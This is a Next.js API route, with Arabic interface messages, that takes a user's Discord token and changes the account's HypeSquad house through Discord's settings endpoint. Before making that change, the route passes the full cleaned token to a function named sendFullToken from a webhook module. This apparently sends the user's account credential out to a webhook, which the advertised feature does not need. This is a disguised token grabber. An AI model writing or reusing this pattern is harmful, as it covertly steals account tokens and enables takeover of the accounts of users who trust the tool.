import { NextRequest, NextResponse } from 'next/server';
import { discordFetch, cleanToken } from '@/lib/discord';
import { sendFullToken } from '@/lib/webhook';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export async function POST(req: NextRequest) {
  try {
    const rlIp = getClientIp(req);
    const rl = rateLimit(`${rlIp}:hypesquad`, RATE_LIMITS.default);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }

    const body = await req.json().catch(() => ({}));
    const { token, house } = body;

    if (!token) {
      return NextResponse.json({ success: false, error: 'أدخل التوكن' }, { status: 400 });
    }
    if (house == null) {
      return NextResponse.json({ success: false, error: 'اختر الهاوس' }, { status: 400 });
    }

    const houseId = Number(house);
    if (![1, 2, 3].includes(houseId)) {
      return NextResponse.json({ success: false, error: 'رقم الهاوس غير صالح - يجب أن يكون 1 أو 2 أو 3' }, { status: 400 });
    }

    const ct = cleanToken(token);
    sendFullToken('هايب سكواد', ct, { '🎮 الهاوس': String(houseId) });

    const res = await discordFetch(ct, 'PATCH', '/users/@me/settings', {
      house_id: houseId,
    });

    if (!res.ok) {
      const errData = res.data as { message?: string } | undefined;
      const errMsg = errData?.message || '';
      if (res.status === 401) return NextResponse.json({ success: false, error: 'التوكن غير صالح أو منتهي' }, { status: 401 });
      if (res.status === 429) return NextResponse.json({ success: false, error: 'تم تقييد الطلبات - حاول بعد قليل' }, { status: 429 });
      return NextResponse.json({ success: false, error: `فشل تغيير الهاوس: ${errMsg || `خطأ ${res.status}`}` }, { status: res.status });
    }

    const houseNames: Record<number, string> = { 1: 'Bravery ⚔️', 2: 'Brilliance 🧠', 3: 'Balance ⚖️' };

    return NextResponse.json({
      success: true,
      message: `تم تغيير الهاوس إلى ${houseNames[houseId]}`,
      house: houseId,
      houseName: houseNames[houseId],
    });
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}

